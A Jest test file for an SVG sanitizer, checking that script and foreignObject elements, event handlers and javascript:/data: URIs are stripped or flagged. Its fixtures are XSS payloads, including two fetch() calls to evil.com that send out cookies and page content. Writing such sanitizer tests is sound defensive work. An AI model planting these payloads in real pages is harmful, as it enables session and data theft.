/* eslint-disable no-undef */
const { sanitizeSVGVNode, validateSVGString } = require('../src/utils/svg-sanitizer');
const { VNode } = require('../src/vdom');

describe('SVG Sanitization - Security Tests', () => {
  describe('sanitizeSVGVNode - Blocking Dangerous Elements', () => {
    it('should block <script> tags', () => {
      const maliciousVNode = new VNode('script', {}, [{ text: "alert('XSS')" }]);
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).toBeNull();
    });

    it('should block <foreignObject> elements', () => {
      const maliciousVNode = new VNode('foreignObject', {}, [
        new VNode('body', {}, [new VNode('script', {}, [{ text: "alert('XSS')" }])]),
      ]);
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).toBeNull();
    });

    it('should block <iframe> elements', () => {
      const maliciousVNode = new VNode('iframe', { attributes: { src: 'http://evil.com' } });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).toBeNull();
    });

    it('should block <embed> elements', () => {
      const maliciousVNode = new VNode('embed', { attributes: { src: 'http://evil.com' } });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).toBeNull();
    });

    it('should block <object> elements', () => {
      const maliciousVNode = new VNode('object', { attributes: { data: 'http://evil.com' } });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).toBeNull();
    });
  });

  describe('sanitizeSVGVNode - Removing Event Handlers', () => {
    it('should remove onclick event handler', () => {
      const maliciousVNode = new VNode('circle', {
        attributes: {
          onclick: "alert('XSS')",
          cx: '50',
          cy: '50',
          r: '40',
        },
      });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.onclick).toBeUndefined();
      expect(result.properties.attributes.cx).toBe('50');
    });

    it('should remove onload event handler', () => {
      const maliciousVNode = new VNode('svg', {
        attributes: {
          onload: "alert('XSS')",
          width: '100',
          height: '100',
        },
      });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.onload).toBeUndefined();
      expect(result.properties.attributes.width).toBe('100');
    });

    it('should remove all on* event handlers', () => {
      const maliciousVNode = new VNode('rect', {
        attributes: {
          onmouseover: "alert('XSS')",
          onmouseout: "alert('XSS')",
          onfocus: "alert('XSS')",
          onblur: "alert('XSS')",
          onerror: "alert('XSS')",
          x: '10',
          y: '10',
        },
      });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.onmouseover).toBeUndefined();
      expect(result.properties.attributes.onmouseout).toBeUndefined();
      expect(result.properties.attributes.onfocus).toBeUndefined();
      expect(result.properties.attributes.onblur).toBeUndefined();
      expect(result.properties.attributes.onerror).toBeUndefined();
      expect(result.properties.attributes.x).toBe('10');
    });
  });

  describe('sanitizeSVGVNode - Blocking Dangerous Protocols', () => {
    it('should block javascript: protocol in href', () => {
      const maliciousVNode = new VNode('a', {
        attributes: {
          href: "javascript:alert('XSS')",
          'xlink:href': '#safe',
        },
      });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.href).toBeUndefined();
      expect(result.properties.attributes['xlink:href']).toBe('#safe');
    });

    it('should block vbscript: protocol in xlink:href', () => {
      const maliciousVNode = new VNode('use', {
        attributes: {
          'xlink:href': 'vbscript:alert("XSS")',
        },
      });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes['xlink:href']).toBeUndefined();
    });

    it('should block data: protocol in href', () => {
      const maliciousVNode = new VNode('a', {
        attributes: {
          href: 'data:text/html,<script>alert("XSS")</script>',
        },
      });
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.href).toBeUndefined();
    });

    it('should allow http:// and https:// protocols', () => {
      const safeVNode = new VNode('a', {
        attributes: {
          href: 'https://example.com',
        },
      });
      const result = sanitizeSVGVNode(safeVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.href).toBe('https://example.com');
    });

    it('should allow fragment identifiers (#id)', () => {
      const safeVNode = new VNode('use', {
        attributes: {
          'xlink:href': '#myGradient',
        },
      });
      const result = sanitizeSVGVNode(safeVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes['xlink:href']).toBe('#myGradient');
    });
  });

  describe('sanitizeSVGVNode - Preserving Safe Elements', () => {
    it('should preserve safe SVG elements', () => {
      const safeVNode = new VNode('svg', { attributes: { width: '100', height: '100' } }, [
        new VNode('circle', { attributes: { cx: '50', cy: '50', r: '40', fill: '#3498db' } }),
        new VNode('rect', { attributes: { x: '10', y: '10', width: '80', height: '60' } }),
        new VNode('path', { attributes: { d: 'M10,10 L90,90', stroke: 'black' } }),
      ]);

      const result = sanitizeSVGVNode(safeVNode);
      expect(result).not.toBeNull();
      expect(result.children).toHaveLength(3);
      expect(result.children[0].tagName).toBe('circle');
      expect(result.children[1].tagName).toBe('rect');
      expect(result.children[2].tagName).toBe('path');
    });

    it('should preserve gradient elements', () => {
      const stopVNode1 = new VNode('stop', { attributes: { offset: '0%', 'stop-color': '#e74c3c' } }, []);
      const stopVNode2 = new VNode('stop', { attributes: { offset: '100%', 'stop-color': '#3498db' } }, []);
      const linearGradient = new VNode(
        'linearGradient',
        { attributes: { id: 'grad1' } },
        [stopVNode1, stopVNode2]
      );
      const defsVNode = new VNode('defs', {}, [linearGradient]);

      const result = sanitizeSVGVNode(defsVNode);
      expect(result).not.toBeNull();
      expect(result.children).toHaveLength(1);
      expect(result.children[0].tagName).toBe('linearGradient');
      expect(result.children[0].children).toHaveLength(2);
    });

    it('should preserve text elements', () => {
      const safeVNode = new VNode('text', {
        attributes: {
          x: '100',
          y: '50',
          'text-anchor': 'middle',
          'font-size': '20',
        },
      }, [{ text: 'Hello SVG' }]);

      const result = sanitizeSVGVNode(safeVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.x).toBe('100');
      expect(result.children[0].text).toBe('Hello SVG');
    });
  });

  describe('sanitizeSVGVNode - Nested Structure Sanitization', () => {
    it('should recursively sanitize nested elements', () => {
      const mixedVNode = new VNode('svg', { attributes: { width: '100' } }, [
        new VNode('g', {}, [
          new VNode('circle', { attributes: { cx: '50', cy: '50', r: '40' } }),
          new VNode('script', {}, [{ text: "alert('XSS')" }]), // Should be removed
          new VNode('rect', {
            attributes: {
              x: '10',
              y: '10',
              onclick: "alert('XSS')", // Should be removed
              width: '50',
            },
          }),
        ]),
      ]);

      const result = sanitizeSVGVNode(mixedVNode);
      expect(result).not.toBeNull();
      expect(result.children).toHaveLength(1); // g element
      expect(result.children[0].children).toHaveLength(2); // circle and rect (script removed)
      expect(result.children[0].children[1].properties.attributes.onclick).toBeUndefined();
      expect(result.children[0].children[1].properties.attributes.width).toBe('50');
    });

    it('should handle deeply nested malicious content', () => {
      const deepVNode = new VNode('svg', {}, [
        new VNode('g', {}, [
          new VNode('g', {}, [
            new VNode('g', {}, [
              new VNode('foreignObject', {}, [
                new VNode('script', {}, [{ text: "alert('XSS')" }]),
              ]),
            ]),
          ]),
        ]),
      ]);

      const result = sanitizeSVGVNode(deepVNode);
      expect(result).not.toBeNull();
      // The foreignObject should be removed, leaving empty nested g elements
      expect(result.children[0].children[0].children[0].children).toHaveLength(0);
    });
  });

  describe('sanitizeSVGVNode - Attribute Whitelisting', () => {
    it('should remove non-whitelisted attributes', () => {
      const vNode = new VNode('circle', {
        attributes: {
          cx: '50',
          cy: '50',
          r: '40',
          'data-custom': 'allowed', // data-* attributes are allowed
          'aria-label': 'Circle', // aria-* attributes are allowed
          'unknown-attr': 'should-be-removed',
        },
      });

      const result = sanitizeSVGVNode(vNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.cx).toBe('50');
      expect(result.properties.attributes['data-custom']).toBe('allowed');
      expect(result.properties.attributes['aria-label']).toBe('Circle');
      expect(result.properties.attributes['unknown-attr']).toBeUndefined();
    });

    it('should preserve all whitelisted presentation attributes', () => {
      const vNode = new VNode('path', {
        attributes: {
          d: 'M10,10 L90,90',
          fill: '#3498db',
          'fill-opacity': '0.8',
          stroke: '#2c3e50',
          'stroke-width': '2',
          'stroke-opacity': '1',
          'stroke-linecap': 'round',
          'stroke-linejoin': 'round',
          opacity: '0.9',
          transform: 'rotate(45)',
        },
      });

      const result = sanitizeSVGVNode(vNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.fill).toBe('#3498db');
      expect(result.properties.attributes['stroke-width']).toBe('2');
      expect(result.properties.attributes.transform).toBe('rotate(45)');
    });
  });

  describe('sanitizeSVGVNode - Sanitization Toggle', () => {
    it('should bypass sanitization when enabled=false', () => {
      const maliciousVNode = new VNode('script', {}, [{ text: "alert('XSS')" }]);
      const result = sanitizeSVGVNode(maliciousVNode, { enabled: false });
      expect(result).not.toBeNull();
      expect(result.tagName).toBe('script');
    });

    it('should sanitize when enabled=true (default)', () => {
      const maliciousVNode = new VNode('script', {}, [{ text: "alert('XSS')" }]);
      const result = sanitizeSVGVNode(maliciousVNode);
      expect(result).toBeNull();
    });
  });

  describe('validateSVGString - String Validation', () => {
    it('should detect <script> tags in SVG string', () => {
      const maliciousSVG = '<svg><script>alert("XSS")</script></svg>';
      const result = validateSVGString(maliciousSVG);
      expect(result.valid).toBe(false);
      expect(result.warnings).toContain('Contains <script> tag');
    });

    it('should detect event handlers in SVG string', () => {
      const maliciousSVG = '<svg onclick="alert(\'XSS\')"><circle cx="50" cy="50" r="40"/></svg>';
      const result = validateSVGString(maliciousSVG);
      expect(result.valid).toBe(false);
      expect(result.warnings).toContain('Contains event handler attributes (onclick, onload, etc.)');
    });

    it('should detect javascript: protocol', () => {
      const maliciousSVG = '<svg><a href="javascript:alert(\'XSS\')"><text>Click</text></a></svg>';
      const result = validateSVGString(maliciousSVG);
      expect(result.valid).toBe(false);
      expect(result.warnings).toContain('Contains javascript: protocol');
    });

    it('should detect <foreignObject> elements', () => {
      const maliciousSVG = '<svg><foreignObject><body><script>alert("XSS")</script></body></foreignObject></svg>';
      const result = validateSVGString(maliciousSVG);
      expect(result.valid).toBe(false);
      expect(result.warnings).toContain('Contains <foreignObject> element');
    });

    it('should detect data:text/html URIs', () => {
      const maliciousSVG = '<svg><image href="data:text/html,<script>alert(\'XSS\')</script>"/></svg>';
      const result = validateSVGString(maliciousSVG);
      expect(result.valid).toBe(false);
      expect(result.warnings).toContain('Contains data:text/html URI (potential XSS vector)');
    });

    it('should validate clean SVG strings', () => {
      const cleanSVG = '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" fill="#3498db"/></svg>';
      const result = validateSVGString(cleanSVG);
      expect(result.valid).toBe(true);
      expect(result.warnings).toHaveLength(0);
    });

    it('should handle empty or invalid input', () => {
      expect(validateSVGString('').valid).toBe(false);
      expect(validateSVGString(null).valid).toBe(false);
      expect(validateSVGString(undefined).valid).toBe(false);
    });
  });

  describe('Complex Real-World Attack Vectors', () => {
    it('should block SVG with embedded HTML via foreignObject', () => {
      const attackVNode = new VNode('svg', {}, [
        new VNode('foreignObject', { attributes: { width: '100', height: '100' } }, [
          new VNode('body', { attributes: { xmlns: 'http://www.w3.org/1999/xhtml' } }, [
            new VNode('script', {}, [{ text: 'fetch("http://evil.com?cookie=" + document.cookie)' }]),
          ]),
        ]),
      ]);

      const result = sanitizeSVGVNode(attackVNode);
      expect(result).not.toBeNull();
      expect(result.children).toHaveLength(0); // foreignObject removed
    });

    it('should block onload in SVG root element', () => {
      const attackVNode = new VNode('svg', {
        attributes: {
          onload: 'fetch("http://evil.com?data=" + document.body.innerHTML)',
          width: '100',
          height: '100',
        },
      });

      const result = sanitizeSVGVNode(attackVNode);
      expect(result).not.toBeNull();
      expect(result.properties.attributes.onload).toBeUndefined();
      expect(result.properties.attributes.width).toBe('100');
    });

    it('should handle mixed legitimate and malicious content', () => {
      const mixedVNode = new VNode('svg', { attributes: { width: '400', height: '300' } }, [
        new VNode('circle', { attributes: { cx: '50', cy: '50', r: '40', fill: 'blue' } }),
        new VNode('script', {}, [{ text: "alert('XSS')" }]),
        new VNode('rect', {
          attributes: {
            x: '100',
            y: '100',
            width: '50',
            height: '50',
            onclick: "alert('XSS')",
          },
        }),
        new VNode('path', { attributes: { d: 'M10,10 L90,90', stroke: 'black' } }),
      ]);

      const result = sanitizeSVGVNode(mixedVNode);
      expect(result).not.toBeNull();
      expect(result.children).toHaveLength(3); // script removed, 3 safe elements remain
      expect(result.children[0].tagName).toBe('circle');
      expect(result.children[1].tagName).toBe('rect');
      expect(result.children[1].properties.attributes.onclick).toBeUndefined();
      expect(result.children[2].tagName).toBe('path');
    });
  });

  describe('Verbose Logging', () => {
    let consoleWarnSpy;
    let consoleLogSpy;

    beforeEach(() => {
      consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
      consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
    });

    afterEach(() => {
      consoleWarnSpy.mockRestore();
      consoleLogSpy.mockRestore();
    });

    it('should log warnings when verboseLogging is enabled', () => {
      const maliciousVNode = new VNode('circle', {
        attributes: {
          onclick: "alert('XSS')",
          cx: '50',
        },
      });

      sanitizeSVGVNode(maliciousVNode, { verboseLogging: true });
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        expect.stringContaining('[SVG SANITIZER] Removed event handler: onclick')
      );
    });

    it('should not log when verboseLogging is disabled', () => {
      const maliciousVNode = new VNode('script', {}, [{ text: "alert('XSS')" }]);
      sanitizeSVGVNode(maliciousVNode, { verboseLogging: false });
      expect(consoleWarnSpy).not.toHaveBeenCalled();
      expect(consoleLogSpy).not.toHaveBeenCalled();
    });
  });
});
